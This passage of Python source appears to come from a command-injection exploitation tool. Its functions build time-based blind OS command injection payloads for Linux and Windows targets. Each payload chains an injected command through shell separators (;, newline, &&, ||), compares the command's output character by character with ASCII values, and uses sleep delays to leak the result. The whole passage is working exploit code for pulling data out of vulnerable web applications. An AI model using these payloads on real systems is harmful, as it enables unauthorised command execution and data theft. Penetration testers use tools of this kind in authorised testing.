                 settings.RANDOM_VAR_GENERATOR + "=\"" + settings.CMD_SUB_PREFIX + cmd + settings.CMD_SUB_SUFFIX + "\"" + separator +
                 "if [ " + str(ascii_char) + " -eq $" + settings.RANDOM_VAR_GENERATOR + " ]" + separator +
                 "then sleep " + str(timesec) + separator +
                 "fi"
                 )

    elif separator == _urllib.parse.quote("&&") :
      ampersand = _urllib.parse.quote("&")
      payload = (ampersand +
                 "sleep 0 " + separator +
                 settings.RANDOM_VAR_GENERATOR + "=\"" + settings.CMD_SUB_PREFIX + cmd + settings.CMD_SUB_SUFFIX + "\"" + separator +
                 "[ " + str(ascii_char) + " -eq $" + settings.RANDOM_VAR_GENERATOR + " ] " + separator +
                 "sleep " + str(timesec)
                 )

    elif separator == "||" :
      pipe = "|"
      payload = (pipe +
                 "[ " + str(ascii_char) + " -ne \"" + settings.CMD_SUB_PREFIX + cmd + settings.CMD_SUB_SUFFIX + "\" ]" + separator +
                 "sleep " + str(timesec)
                 )
    else:
      pass

    if settings.CUSTOM_INJECTION_MARKER:
      payload = payload + separator

  return payload

"""
__Warning__: The alternative shells are still experimental.
"""
def fp_result_alter_shell(separator, cmd, num_of_chars, ascii_char, timesec, http_request_method):
  if settings.TARGET_OS == settings.OS.WINDOWS:
    if separator in ("|", "||"):
      pipe = "|"
      payload = (pipe + settings.SINGLE_WHITESPACE +
                "for /f \"tokens=*\" %i in ('cmd /c " +
                cmd +
                "') do if %i==" + str(ascii_char) + settings.SINGLE_WHITESPACE +
                "cmd /c " + settings.WIN_PYTHON_INTERPRETER + " -c \"import time; time.sleep(" + str(2 * timesec + 1) + settings.CMD_SUB_SUFFIX + "\""
                )
    elif separator == _urllib.parse.quote("&&") :
      ampersand = _urllib.parse.quote("&")
      payload = (ampersand + settings.SINGLE_WHITESPACE +
                "for /f \"tokens=*\" %i in ('cmd /c " +
                cmd +
                "') do if %i==" + str(ascii_char) + settings.SINGLE_WHITESPACE +
                "cmd /c " + settings.WIN_PYTHON_INTERPRETER + " -c \"import time; time.sleep(" + str(2 * timesec + 1) + settings.CMD_SUB_SUFFIX + "\""
                )
    else:
      pass

  else:
    if separator in (";", "%0a"):
      payload = (separator +
                 settings.RANDOM_VAR_GENERATOR + "=" + settings.CMD_SUB_PREFIX + settings.LINUX_PYTHON_INTERPRETER + " -c \"print(" + settings.CMD_SUB_PREFIX + "echo " + settings.CMD_SUB_PREFIX + cmd + ")))\n\"" + settings.CMD_SUB_SUFFIX + separator +
                 "if [ " + str(ascii_char) + " -eq ${" + settings.RANDOM_VAR_GENERATOR + "} ]" + separator +
                 "then " + settings.CMD_SUB_PREFIX + settings.LINUX_PYTHON_INTERPRETER + " -c \"import time\ntime.sleep(" + str(timesec) + settings.CMD_SUB_SUFFIX + "\"" + settings.CMD_SUB_SUFFIX + separator +
                 "fi"
                 )

    elif separator == _urllib.parse.quote("&&") :
      ampersand = _urllib.parse.quote("&")
      payload = (ampersand +
                 settings.CMD_SUB_PREFIX + settings.LINUX_PYTHON_INTERPRETER + " -c \"import time\ntime.sleep(0)\") " + separator +
                 settings.RANDOM_VAR_GENERATOR + "=" + settings.CMD_SUB_PREFIX + settings.LINUX_PYTHON_INTERPRETER + " -c \"print(" + settings.CMD_SUB_PREFIX + "echo " + settings.CMD_SUB_PREFIX + cmd + ")))\n\"" + settings.CMD_SUB_SUFFIX + separator +
                 "[ " + str(ascii_char) + " -eq ${" + settings.RANDOM_VAR_GENERATOR + "} ] " + separator +
                 settings.CMD_SUB_PREFIX + settings.LINUX_PYTHON_INTERPRETER + " -c \"import time\ntime.sleep(" + str(timesec) + settings.CMD_SUB_SUFFIX + "\"" + settings.CMD_SUB_SUFFIX  
                 )


    elif separator == "||" :
      pipe = "|"
      payload = (pipe +
                 "[ " + str(ascii_char) + " -ne " + settings.CMD_SUB_PREFIX + settings.LINUX_PYTHON_INTERPRETER + " -c \"print(" + settings.CMD_SUB_PREFIX + "echo " + settings.CMD_SUB_PREFIX + cmd + ")))\n\") ] " + separator +
                 settings.CMD_SUB_PREFIX + settings.LINUX_PYTHON_INTERPRETER + " -c \"import time\ntime.sleep(0)\") " + pipe + settings.CMD_SUB_PREFIX + settings.LINUX_PYTHON_INTERPRETER + " -c \"import time\ntime.sleep(" + str(timesec) + settings.CMD_SUB_SUFFIX + "\"" + settings.CMD_SUB_SUFFIX  
                 )
    else:
      pass

    if settings.CUSTOM_INJECTION_MARKER:
      payload = payload + separator

  return checks.sanitize_payload_newlines(payload)

# eof